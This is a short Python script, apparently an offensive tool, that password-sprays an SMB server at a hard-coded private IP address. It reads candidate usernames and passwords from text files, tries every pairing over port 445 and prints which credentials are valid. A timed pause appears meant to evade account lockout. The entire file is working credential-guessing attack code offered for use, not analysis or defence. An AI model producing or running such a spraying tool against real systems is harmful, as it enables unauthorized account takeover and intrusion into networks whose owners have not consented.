from smb.SMBConnection import SMBConnection
import time

attempts = 2
count = 0
delay = 10

def authenticate_smb(server, username, password, domain=''):
    smb_connection = SMBConnection(username, password, 'python_script', server, domain=domain, use_ntlm_v2=True, is_direct_tcp=True)

    try:
        # Establish an SMB connection
        smb_connection.connect(server, 445)
        shares = smb_connection.listShares()
        print("VALID: " + username + ":" + password)
    except Exception as e:
        if str(e) == "SMB connection not authenticated":
            print("INVALID: " + username + ":" + password)
        else:
            print("Error:", e)

    finally:
        if smb_connection:
            smb_connection.close()

if __name__ == "__main__":
    # Replace these values with your SMB server details
    smb_server = "192.168.3.241"
    smb_username = "users.txt"
    smb_password = "passwords.txt"

    with open(smb_password, 'r') as passwords:
        for password in passwords:
            if count == attempts:
                time.sleep(delay)
                count = 0
            count += 1
            with open(smb_username, 'r') as users:
                for user in users:
                    authenticate_smb(smb_server, user.strip(), password.strip())